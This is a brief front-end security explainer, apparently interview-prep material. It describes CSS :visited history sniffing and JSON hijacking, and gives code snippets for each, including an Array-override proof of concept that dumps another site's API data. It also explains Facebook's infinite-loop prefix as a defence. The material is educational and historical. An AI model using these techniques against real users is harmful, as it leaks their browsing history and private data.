# Can you explain any common techniques or recent issues solved in regards to front-end security ?

## Hack a user's history through CSS :visited selectors
There was a hack to steal user's browsing history by using `getComputedStyle(anchor).color`

```js
if (getComputedStyle(link, '').color === 'rgb(0, 0, 128)') {
  // we know link.href has not been visited
}
else {
  // we know link.href has been visited
}
```

## JSON hijacking
Steal a user's API response by overriding JavaScript Array

```html
<script>
function Array() {
  var that = this;
  var index = 0;
  // Populating the array with setters, which dump the value when called
  var valueExtractor = function(value) {
    // Alert the value
    alert(value);
    // Set the next index to use this method as well
    that.__defineSetter__(index.toString(),valueExtractor );
    index++;
  };
  // Set the setter for item 0
  that.__defineSetter__(index.toString(),valueExtractor );
  index++;
}
</script>
<script src="some-users-api-that-outputs-array" /><!-- API URL outputs array data can be executed in attacker's website -->
```

That's why Facebook put a infinity loop before API response

```json
for(;;);[{"id": 1}, {"id": 2}]
```

### References
 - https://dbaron.org/mozilla/visited-privacy
 - https://portswigger.net/blog/json-hijacking-for-the-modern-web
 - https://dev.to/antogarand/why-facebooks-api-starts-with-a-for-loop-1eob
